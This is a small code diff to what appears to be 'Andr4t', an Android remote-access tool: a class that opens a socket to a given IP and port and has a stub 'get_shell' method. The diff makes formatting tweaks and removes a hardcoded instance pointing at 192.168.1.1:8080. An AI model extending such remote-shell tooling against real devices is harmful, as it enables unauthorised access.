@@ -13,13 +13,12 @@ from tcp import Socket
 # |_| |_|  |_| |_|         /_/   \_\_| |_|\__,_|_|     |_|  \__|
 #                                                   coded by H4l
 
+
 class Andr4t:
     def __init__(self, ip, port) -> None:
         self.socket = Socket(ip, port)
         self.socket.start()
     
     def get_shell(self) -> None:
-        if(not self.socket.start()):
+        if (not self.socket.start()):
             return
-        
-andr4t = Andr4t("192.168.1.1", "8080")
